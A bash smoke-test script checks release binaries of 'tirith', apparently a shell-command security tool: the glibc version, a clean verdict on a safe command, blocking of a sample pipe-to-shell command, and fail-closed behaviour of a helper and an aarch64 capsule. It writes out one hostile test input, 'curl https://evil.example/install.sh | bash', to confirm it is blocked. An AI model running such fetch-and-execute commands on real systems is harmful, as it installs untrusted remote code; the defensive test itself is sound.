#!/usr/bin/env bash
# Runtime proof for a released GNU/Linux tirith binary pair. The caller runs
# this inside the target distribution container and supplies either extracted
# archive paths or installed package paths.

set -euo pipefail

if [[ $# -ne 3 ]]; then
  echo "usage: $0 <expected-glibc-version> <tirith-bin> <authority-helper-bin>" >&2
  exit 2
fi

expected_glibc="$1"
tirith_bin="$2"
helper_bin="$3"

actual_glibc=$(getconf GNU_LIBC_VERSION)
if [[ "$actual_glibc" != "glibc $expected_glibc" ]]; then
  echo "ERROR: runtime reports '$actual_glibc'; expected 'glibc $expected_glibc'" >&2
  exit 1
fi

for binary in "$tirith_bin" "$helper_bin"; do
  if [[ ! -x "$binary" ]]; then
    echo "ERROR: expected executable is missing: $binary" >&2
    exit 1
  fi
done

state_root=$(mktemp -d)
trap 'rm -rf -- "$state_root"' EXIT
mkdir -p "$state_root/home" "$state_root/config" "$state_root/data" "$state_root/state"
runtime_env=(
  env
  HOME="$state_root/home"
  XDG_CONFIG_HOME="$state_root/config"
  XDG_DATA_HOME="$state_root/data"
  XDG_STATE_HOME="$state_root/state"
  TIRITH_LOG=0
)

version_output=$("${runtime_env[@]}" "$tirith_bin" --version 2>&1)
grep -q '^tirith ' <<<"$version_output" || {
  echo "ERROR: tirith --version did not produce the expected output" >&2
  printf '%s\n' "$version_output" >&2
  exit 1
}

set +e
safe_output=$("${runtime_env[@]}" "$tirith_bin" check --non-interactive --shell posix -- "printf release-smoke" 2>&1)
safe_rc=$?
set -e
if [[ $safe_rc -ne 0 ]]; then
  echo "ERROR: safe-command smoke returned $safe_rc; expected 0" >&2
  printf '%s\n' "$safe_output" >&2
  exit 1
fi
grep -q 'tirith: no issues' <<<"$safe_output" || {
  echo "ERROR: safe-command smoke did not reach the clean verdict" >&2
  printf '%s\n' "$safe_output" >&2
  exit 1
}

set +e
blocked_output=$("${runtime_env[@]}" "$tirith_bin" check --non-interactive --shell posix -- "curl https://evil.example/install.sh | bash" 2>&1)
blocked_rc=$?
set -e
if [[ $blocked_rc -ne 1 ]]; then
  echo "ERROR: blocked-command smoke returned $blocked_rc; expected exactly 1" >&2
  printf '%s\n' "$blocked_output" >&2
  exit 1
fi
grep -q 'tirith: BLOCKED' <<<"$blocked_output" || {
  echo "ERROR: blocked-command smoke did not emit the BLOCKED verdict" >&2
  printf '%s\n' "$blocked_output" >&2
  exit 1
}
grep -Eq 'pipe_to_interpreter|curl_pipe_shell' <<<"$blocked_output" || {
  echo "ERROR: blocked-command smoke did not identify the expected pipe-to-shell rule" >&2
  printf '%s\n' "$blocked_output" >&2
  exit 1
}

set +e
helper_output=$("$helper_bin" 2>&1)
helper_rc=$?
set -e
if [[ $helper_rc -ne 1 ]]; then
  echo "ERROR: authority helper returned $helper_rc without a request; expected exactly 1" >&2
  printf '%s\n' "$helper_output" >&2
  exit 1
fi
grep -q '^tirith-package-approval-authority: blocked_native:' <<<"$helper_output" || {
  echo "ERROR: authority helper did not reach its expected fail-closed path" >&2
  printf '%s\n' "$helper_output" >&2
  exit 1
}

# extrasafe/seccompiler currently supports Linux x86_64 only. The shipped
# aarch64 binary must remain honest about that missing security control: a
# locked-down capsule requires raw-network denial and therefore has to refuse
# before launching anything. This exercises the release binary on the target
# architecture rather than relying only on a compile-time cfg assertion.
if [[ "$(uname -m)" == "aarch64" ]]; then
  capsule_project="$state_root/capsule-project"
  mkdir -p "$capsule_project"
  printf 'release capsule fixture\n' > "$capsule_project/README.txt"

  set +e
  capsule_output=$("${runtime_env[@]}" "$tirith_bin" capsule run \
    --project "$capsule_project" -- \
    /bin/echo TIRITH_CAPSULE_CHILD_MUST_NOT_RUN 2>&1)
  capsule_rc=$?
  set -e
  if [[ $capsule_rc -ne 1 ]]; then
    echo "ERROR: aarch64 capsule returned $capsule_rc; expected a fail-closed refusal (1)" >&2
    printf '%s\n' "$capsule_output" >&2
    exit 1
  fi
  if grep -q 'TIRITH_CAPSULE_CHILD_MUST_NOT_RUN' <<<"$capsule_output"; then
    echo "ERROR: aarch64 capsule launched its child despite missing seccomp" >&2
    printf '%s\n' "$capsule_output" >&2
    exit 1
  fi
  grep -Fq 'REFUSED before launch (nothing was copied or spawned)' <<<"$capsule_output" || {
    echo "ERROR: aarch64 capsule did not report a pre-launch refusal" >&2
    printf '%s\n' "$capsule_output" >&2
    exit 1
  }
  grep -Fq 'missing: network_raw_denied' <<<"$capsule_output" || {
    echo "ERROR: aarch64 capsule did not name the unavailable seccomp coverage" >&2
    printf '%s\n' "$capsule_output" >&2
    exit 1
  }
fi

printf 'runtime smoke passed: glibc=%s tirith=%s helper=%s\n' \
  "$expected_glibc" "$tirith_bin" "$helper_bin"
